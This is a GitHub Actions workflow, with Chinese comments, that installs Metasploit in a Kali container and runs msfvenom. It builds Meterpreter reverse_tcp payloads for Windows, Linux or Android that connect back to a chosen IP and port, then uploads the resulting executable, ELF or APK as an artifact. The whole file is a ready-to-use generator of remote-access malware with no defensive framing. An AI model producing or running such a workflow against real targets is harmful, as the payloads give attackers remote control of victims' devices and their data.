name: Generate Metasploit Payload

on:
  workflow_dispatch:
    inputs:
      platform:
        description: '选择目标平台'
        required: true
        default: 'windows'
        type: choice
        options:
          - windows
          - linux
          - android
      lhost:
        description: '输入你的公网IP或内网IP'
        required: true
        default: '192.168.1.100'
      lport:
        description: '输入监听端口'
        required: true
        default: '4444'
      

jobs:
  build:
    runs-on: ubuntu-latest
    steps:

    - name: Generate Payload using Kali Docker
      run: |
        # 拉取 Kali 镜像
        docker pull kalilinux/kali-rolling
        
        # 根据用户选择的平台，映射对应的 msfvenom payload
        case "${{ github.event.inputs.platform }}" in
          "windows")
            PAYLOAD="windows/x64/meterpreter/reverse_tcp"
            EXT="exe"
            EXTEND="-f exe"
            ;;
          "android")
            PLATFORM="--platform android"
            PAYLOAD="android/meterpreter/reverse_tcp"
            EXT="apk"
            ;;
          "linux")
            PAYLOAD="linux/x64/meterpreter/reverse_tcp"
            EXT="elf"
            EXTEND="-f elf"
            ;;
          *)
            echo "不支持的平台"
            exit 1
            ;;
        esac

        echo "正在生成 $PAYLOAD..."
        echo "ENAME=$(cat /proc/sys/kernel/random/uuid)" >> $GITHUB_ENV
        # 运行容器并生成 Payload
        docker run --rm \
          -v "${PWD}:/output" \
          -u root \
          kalilinux/kali-rolling \
          bash -c "apt-get update && apt-get install -y metasploit-framework && msfvenom $PLATFORM -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} $EXTEND -o '/output/${{ env.ENAME }}.$EXT'"
        
    - name: Upload Payload
      uses: actions/upload-artifact@v4
      with:
        name: Generated-Payload
        path: ${{ env.ENAME }}.*
